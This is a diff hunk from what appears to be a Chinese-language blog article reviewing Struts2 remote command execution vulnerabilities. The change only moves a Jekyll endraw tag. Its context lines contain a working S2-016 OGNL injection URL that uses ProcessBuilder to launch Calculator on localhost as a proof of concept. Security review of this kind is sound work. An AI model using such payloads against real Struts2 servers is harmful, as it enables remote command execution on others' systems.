@@ -206,9 +206,9 @@ S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 `$
     或者
     
     http://localhost:8080/S2-016/default.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'open','/Applications/Calculator.app'})).start()}
+{% endraw %}
 
 ![]({{ site.url }}/public/img/article/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/10.png)
-{% endraw %}
 
 ### S2-029
 
